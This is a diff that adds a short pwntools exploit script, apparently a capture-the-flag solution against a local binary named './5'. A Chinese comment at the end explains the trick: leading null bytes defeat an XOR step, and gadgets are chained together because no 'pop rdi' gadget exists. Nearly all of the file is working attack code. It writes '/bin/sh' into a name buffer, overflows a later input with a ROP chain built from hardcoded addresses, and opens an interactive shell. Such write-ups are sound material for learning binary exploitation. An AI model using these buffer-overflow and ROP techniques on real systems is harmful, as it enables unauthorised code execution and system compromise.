@@ -1,0 +1,15 @@
+from pwn import *
+
+p = process('./5')
+
+context(arch='amd64', os='linux', log_level='debug')
+
+p.sendlineafter(b'if you want to watch demo', b'no')
+p.sendlineafter(b'please int your name', b'/bin/sh\x00')
+
+payload = b'\x00'*32+b'a'*(0x58-32) + p64(0x401A18) + p64(0x4040F0) + p64(0x401A21) + p64(0x401C15) + p64(0x401A39)
+payload = payload.ljust(0xf0, b'\x00')
+p.sendafter(b'please introduce yourself', payload)
+
+p.interactive()
+这题真的很阴了，那个demo把我绕进去了（下回其实可以不用放demo的），其实根本不需要，不用看，就是一个很简单的rop链，只不过要替换一下先放32个0防止他给我异或了，它会让我们的shellcode被异或成很奇怪的样子，我们现在很显而易见的要去找pop，rdi但是根本没有拼接一下就行了
